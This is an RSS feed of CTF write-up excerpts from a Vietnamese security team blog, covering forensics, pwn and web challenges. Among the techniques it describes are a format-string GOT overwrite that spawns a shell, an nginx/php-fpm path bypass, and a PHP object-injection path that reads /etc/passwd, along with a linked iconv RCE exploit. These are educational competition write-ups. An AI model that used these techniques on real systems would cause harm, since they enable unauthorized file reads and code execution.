<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>MSEC</title><link>https://mtasecurity.github.io/MSEC/</link><description>Recent content on MSEC</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>© 2026</copyright><atom:link href="https://mtasecurity.github.io/MSEC/index.xml" rel="self" type="application/rss+xml"/><item><title>BUCKEYE2025 FORENSICS &amp; MISC: Big Data Analysis &amp; Minecraft</title><link>https://mtasecurity.github.io/MSEC/for/1763050213012-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1763050213012-for/</guid><description>&lt;p&gt;&lt;strong&gt;BUCKEYECTF FORENSICS &amp;amp; MISC WRITEUP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FOR: Big Data Analysis
MISC: Minecraft&lt;/p&gt;
&lt;p&gt;I, Big Data Analysis&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rJjSjNfeZx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Đề bài của challenge rất ngắn gọn, tìm tất cả các repository names trong Github create events 2023&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Để có thể giải được challenge này, ta phải truy cập vào một trang có thống kê về số lượng các thể loại của Github của ngày/tháng/năm&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Trang mà tôi muốn nhắc đến đó chính là &lt;strong&gt;Console Google Cloud&lt;/strong&gt;&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1763050213012-for/featured.png"/></item><item><title>BUCKEYE2025 FORENSICS: zip2john2zip</title><link>https://mtasecurity.github.io/MSEC/for/1763050206458-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1763050206458-for/</guid><description>&lt;p&gt;**BUCKEYECTF2025 FORENSICS WRITEUP
**
FOR1: Zip2john2zip&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Sy6R_7fx-l.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Đầu tiên, từ đề bài, ta có thể thấy được vấn đề là người dùng đã quên mật khẩu của 1 file zip nào đó của họ, thứ còn lại của họ chỉ là 1 cái hash và chúng ta phải lần theo dấu vết từ đây&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;1, CRACK PASSWORD&lt;/strong&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HkDMKmMgbg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Đọc qua hash, ta thấy nó có dạng pkzip vậy nên ta dự đoán file chứa hash này là một file zip bị khóa, suy ra ta cần crack (trong đề gợi ý) để tìm ra pass của file zip&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1763050206458-for/featured.png"/></item><item><title>CCSCV2025 FOR NOSTALGIAS</title><link>https://mtasecurity.github.io/MSEC/for/1761292850356-afw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1761292850356-afw/</guid><description>&lt;p&gt;FORENSICS CSCV WRITEUP 2025
From: MTA.Support&lt;/p&gt;
&lt;p&gt;FOR2: NostalgiaS&lt;/p&gt;
&lt;p&gt;First, after extract the file zip with the password provided by admin, we have file challenge.ad1 and we need to open it in FTK Imager&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1OkgoEClg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Remember the user who was hacked name kadoyat, so we go to get information in users/kadoyat&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BJySeoNClx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Look around for important files like documents, downloads, desktop but there are no any information there so that we need to navigate to find out from his web history&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1761292850356-afw/featured.png"/></item><item><title>CSCV 2025 Final Attack-Defense</title><link>https://mtasecurity.github.io/MSEC/pwn/1763442039854-pwn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/pwn/1763442039854-pwn/</guid><description>&lt;ul&gt;
&lt;li&gt;&lt;a
href="#cscv-2025-final-attack-defense"&gt;CSCV 2025 Final Attack-Defense&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a
href="#daemon-pwn01"&gt;Daemon Pwn01&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
href="#deamon-pwn03"&gt;Daemon Pwn03&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;After 8 hours of Attack–Defense competition, &lt;code&gt;MTA.ADC&lt;/code&gt; finished within the &lt;code&gt;Top 4 strongest&lt;/code&gt; teams and achieved &lt;code&gt;3rd place&lt;/code&gt; overall.&lt;/p&gt;
&lt;h2 class="relative group"&gt;Daemon Pwn01
&lt;div id="daemon-pwn01" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#daemon-pwn01" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;Challenge directory structure:&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;h3 class="relative group"&gt;1. Introduction
&lt;div id="1-introduction" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-introduction" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;p&gt;The challenge provides a binary simulating a file manager that allows registration, login, and basic file operations.&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/pwn/1763442039854-pwn/featured.png"/></item><item><title>CSCV2025 - Pwn</title><link>https://mtasecurity.github.io/MSEC/pwn/1761314838840-pwn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/pwn/1761314838840-pwn/</guid><description>&lt;h1 class="relative group"&gt;CSCV2025 - Pwn
&lt;div id="cscv2025---pwn" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cscv2025---pwn" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;h2 class="relative group"&gt;RacehorseS
&lt;div id="racehorses" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#racehorses" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="ảnh"
src="https://hackmd.io/_uploads/S1kbkfm0ee.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h3 class="relative group"&gt;Summary
&lt;div id="summary" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#summary" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Sources:&lt;/strong&gt; &lt;a
href="https://qual2.cscv.vn/files/646ccd11c5722a285edc936993ab6086/horse_say.zip?token=eyJ1c2VyX2lkIjo1OTI5LCJ0ZWFtX2lkIjoxMjQxLCJmaWxlX2lkIjo3MH0.aPWaAg.70NIT6vV5C5Pt2qZs-Rtt9bfH4k"
target="_blank"
&gt;horse_say.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The binary contains a format-string vulnerability in &lt;code&gt;printf(s)&lt;/code&gt; and &lt;strong&gt;Partial RELRO&lt;/strong&gt;. Use a format-string to overwrite GOT entries. The goal is to get a shell by redirecting &lt;code&gt;strlen()&lt;/code&gt; to &lt;code&gt;system()&lt;/code&gt; and passing &lt;strong&gt;&amp;quot;/bin/sh&amp;quot;&lt;/strong&gt;.&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/pwn/1761314838840-pwn/featured.png"/></item><item><title>CSCV2025 FOR CASEALPHAS</title><link>https://mtasecurity.github.io/MSEC/for/1761315037677-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1761315037677-for/</guid><description>&lt;p&gt;FORENSICS CSCV 2025
from: MTA.SUPPORT&lt;/p&gt;
&lt;p&gt;FOR3: CASE ALPHAS&lt;/p&gt;
&lt;p&gt;First, we have the file zip from admin, then we enter the password to extract this&lt;/p&gt;
&lt;p&gt;After extracted, we got 2 files&lt;/p&gt;
&lt;p&gt;Open ReadMe.pdf to read the information and get the password to extract file zip&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HJo28szCxg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Open evidences, there is 3 file, we just need to care about evidences.ad1 first&lt;/p&gt;
&lt;p&gt;Open it in FTK Imager:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/H1eTwsGRgx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Fortunately, after a quick scan, notice that the insider threat has downloaded chatgpt desktop and simplenote, so that we need to check file .db in 2 files&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1761315037677-for/featured.png"/></item><item><title>CSCV2025 FOR COVERTS</title><link>https://mtasecurity.github.io/MSEC/for/1761315051227-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1761315051227-for/</guid><description>&lt;p&gt;FORENSICS CSCV2025 WRITEUP
From: MTA.Support&lt;/p&gt;
&lt;p&gt;FOR4: CovertS&lt;/p&gt;
&lt;p&gt;First, we have the file and the password provided admin, after extract the file, we have file challenge.pcapng&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HJb7V4SCgx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Open file, because this file contain 1GB of data, so that we need to predict what protocol is suspicious and start to filter around this&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rJQhV4BRle.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Because the hacker exfiltrated sth, to reduce the possibility of being detected, we often have to split files and data to smaller pieces, so we will need a lot of packets. From there, we can eliminate some protocols such as NTP, ARP, HTTP, UDP&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1761315051227-for/featured.png"/></item><item><title>CSCV2025 FOR DNS</title><link>https://mtasecurity.github.io/MSEC/for/1761315057946-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1761315057946-for/</guid><description>&lt;p&gt;FORENSICS CSCV 2025 WRITE UP
From: MTA.Support&lt;/p&gt;
&lt;p&gt;FOR1: DNS&lt;/p&gt;
&lt;p&gt;After downloading and unzipping the file, we will get the following 3 files&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;capture.pcap&lt;/li&gt;
&lt;li&gt;access.log&lt;/li&gt;
&lt;li&gt;error.log&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;First open the .pcap file with wireshark and get the following interface&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/B1GY8IfAeg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Rearrange the section information and scroll from top to bottom&lt;/p&gt;
&lt;p&gt;We find the suspicious dns with information ending in hex.cloudflar3.com&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/S1riwLMRlx.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/H1l6wLf0le.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Get the query response, we has:&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1761315057946-for/featured.png"/></item><item><title>FORENSICS</title><link>https://mtasecurity.github.io/MSEC/for/mta/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/mta/</guid><description>&lt;h1 class="relative group"&gt;WRITE UP FOR FORENSICS CHALLENGE IN MTA CTF 2026
&lt;div id="write-up-for-forensics-challenge-in-mta-ctf-2026" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#write-up-for-forensics-challenge-in-mta-ctf-2026" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Team: vibe_coders&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Xin chào mọi người, cuối tuần vừa rồi, team mình vừa tham gia kỳ thi MTA CTF 2026 và giải quyết được 2 challenges Forensics, và hôm nay mình sẽ chia sẻ cho mọi người cách làm 2 bài này&lt;/p&gt;
&lt;h1 class="relative group"&gt;1. Siusiusiu (Anh 7)
&lt;div id="1-siusiusiu-anh-7" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-siusiusiu-anh-7" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BJv8V_0Sbl.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/mta/featured.png"/></item><item><title>LEAK FORCE</title><link>https://mtasecurity.github.io/MSEC/web/1761315315933-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761315315933-web/</guid><description>&lt;h1 class="relative group"&gt;LEAK FORCE
&lt;div id="leak-force" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#leak-force" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BJQDAszAgg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h4 class="relative group"&gt;TEST
&lt;div id="test" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#test" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;
&lt;p&gt;Challenge cung cấp một mã nguồn HTML &lt;a
href="http://web1.cscv.vn:9981/"
target="_blank"
&gt;http://web1.cscv.vn:9981/&lt;/a&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJ8899f0gg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Trước tiên em sẽ thử các chức năng của web&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Register các thứ các thứ rồi login với username: abc2, password: abc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sau khi login xong thì sẽ được chuyển tới trang &lt;a
href="http://web1.cscv.vn:9981/profile.html"
target="_blank"
&gt;http://web1.cscv.vn:9981/profile.html&lt;/a&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HJwSEsG0le.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761315315933-web/featured.png"/></item><item><title>Magik</title><link>https://mtasecurity.github.io/MSEC/web/1761494653599-tung/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761494653599-tung/</guid><description>&lt;h1 class="relative group"&gt;Magik
&lt;div id="magik" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#magik" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Author : Tiwza&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;Overview
&lt;div id="overview" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="{BBFD61B4-A254-4DB8-9F65-A1E5CC5EEB72}"
src="https://hackmd.io/_uploads/H1KCSzoRxg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h3 class="relative group"&gt;Cầu trúc của bài này
&lt;div id="cầu-trúc-của-bài-này" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#c%e1%ba%a7u-tr%c3%bac-c%e1%bb%a7a-b%c3%a0i-n%c3%a0y" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code=" data-lang="code="&gt;magik/
└── app/
├── index.php
├── convert.sh
├── docker-compose.yml
├── Dockerfile
├── flags.txt
└── readflag.c
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 class="relative group"&gt;Lần lượt đọc từng file
&lt;div id="lần-lượt-đọc-từng-file" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#l%e1%ba%a7n-l%c6%b0%e1%bb%a3t-%c4%91%e1%bb%8dc-t%e1%bb%abng-file" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Dockerfile&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;- Đọc `Dockerfile` để hiểu rõ hơn
```code=
COPY readflag.c /readflag.c
RUN gcc /readflag.c -o /readflag
RUN chmod u+s /readflag
RUN rm -f /readflag.c
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Đặt &lt;code&gt;SUID&lt;/code&gt; lên &lt;code&gt;/readflag&lt;/code&gt; nên user ở &lt;code&gt; www-data&lt;/code&gt; không thể đọc&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761494653599-tung/featured.png"/></item><item><title>OxL4ugh CTF</title><link>https://mtasecurity.github.io/MSEC/web/0xl4ugh/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/0xl4ugh/</guid><description>&lt;h1 class="relative group"&gt;0xNote
&lt;div id="0xnote" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#0xnote" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/ryOk1sVIWx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h2 class="relative group"&gt;Overview
&lt;div id="overview" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Backend : &lt;strong&gt;fpm&lt;/strong&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJSBJj4U-l.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Proxy : &lt;strong&gt;nginx&lt;/strong&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HkQCko4LZl.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Giao diện
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SkCqlsE8be.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Tuy nhiên bị chặn ở &lt;code&gt;/premium.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;Solve
&lt;div id="solve" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solve" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Với cách viết proxy như sau ta có thể bypass bằng việc thêm &lt;code&gt;index.php&lt;/code&gt; ngay sau thư mục mà ta bị chặn (&lt;code&gt;premium.php&lt;/code&gt;)
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BkGVeoVI-x.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a
href="https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm"
target="_blank"
&gt;Cách bypass ở đây&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Sau khi vào được &lt;code&gt;/premium.php&lt;/code&gt; bằng &lt;code&gt;/premium.php/index.php&lt;/code&gt; ta thấy được ứng dụng set color không fillter input người dùng&lt;/li&gt;
&lt;li&gt;Như đoạn code sau nếu có thể kiểm soát được &lt;code&gt;color&lt;/code&gt; và &lt;code&gt;note&lt;/code&gt; thì có thể tạo ra 1 object mới :
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkKAWiNL-e.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;Exploit
&lt;div id="exploit" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#exploit" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì&lt;/li&gt;
&lt;li&gt;Set path : &lt;code&gt;php://filter/convert.base64-encode/resource=/etc/passwd&lt;/code&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Sy_7VjNUZx.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Set Classname
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/H1PwVjEIWl.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Đọc kết quả
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkbq4sV8Wx.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Auket lấy được &lt;code&gt;etc/passwd&lt;/code&gt; tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rJzRNiVUZg.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="relative group"&gt;Nâng quyền
&lt;div id="nâng-quyền" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#n%c3%a2ng-quy%e1%bb%81n" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ngay khi thực hiện được &lt;code&gt;SPLFileObject&lt;/code&gt; như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ &lt;a
href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py"
target="_blank"
&gt;đoạn tài liệu sau&lt;/a&gt; và &lt;a
href="https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html"
target="_blank"
&gt;cái này&lt;/a&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJfsHsVIZl.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
